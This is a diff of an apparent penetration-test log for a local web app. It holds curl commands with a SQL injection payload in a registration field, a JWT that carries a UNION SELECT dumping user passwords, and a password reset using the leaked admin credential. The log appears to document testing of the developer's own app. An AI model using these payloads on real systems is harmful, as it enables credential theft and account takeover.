@@ -154,7 +154,7 @@ source pen_tests.sh
 
 Testing SQL Injection by passing default data validation to access the registration endpoint
 
-curl -X POST http://localhost:5500/client_registeration -d 'fullName=John Doe&userName=johndoe&email=noname@maildrop.cc" OR "1"="1&password=password&phone=1234567890'
+curl -X POST http://localhost:5500/client_registeration -d 'fullName=newJohnDoe29761&userName=newjohndoe25015&email=newnoname20920@maildrop.cc" OR "1"="1&password=password&phone=1234567890'
 
 {"msg":"Email already Exist"}
 ------------------------------------------------
@@ -183,7 +183,7 @@ eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6InNwYW1tZXIiLCJlbWFpbCI6InN
 
 Testing Resetting the password of the retrieved account
 
-curl -X POST http://localhost:5500/update_info -d "token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6InNwYW1tZXIiLCJlbWFpbCI6InNwYW1AZW1haWwuY29tXCIgdW5pb24gc2VsZWN0IHBhc3N3b3JkIHx8IFwiOlwiIHx8IGVtYWlsIGZyb20gdXNlcnM7LS0iLCJyb2xlIjoiYWRtaW5AMTIzNDphZG1pbkB0ZXN0LmNvbSJ9.Ket7bPwysNf0cmO2YJmg_ZuIyRabd6Byu9ROUq9vnCA&currentPassword=test&newPassword=newpass"
+curl -X POST http://localhost:5500/update_info -d "token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyTmFtZSI6InNwYW1tZXIiLCJlbWFpbCI6InNwYW1AZW1haWwuY29tXCIgdW5pb24gc2VsZWN0IHBhc3N3b3JkIHx8IFwiOlwiIHx8IGVtYWlsIGZyb20gdXNlcnM7LS0iLCJyb2xlIjoiYWRtaW5AMTIzNDphZG1pbkB0ZXN0LmNvbSJ9.Ket7bPwysNf0cmO2YJmg_ZuIyRabd6Byu9ROUq9vnCA&currentPassword=admin@1234&newPassword=newpass"
 
 {"msg":"Passowrd Reseted"}
 ------------------------------------------------
@@ -214,5 +214,7 @@ curl -X POST http://localhost:5500/client_login -d 'email=nonexistent@example.co
 <h1>Bad Request</h1>
 <p>The browser (or proxy) sent a request that this server could not understand.</p>
 
+-------------------------------------
+------------------------------------
 
 ```   
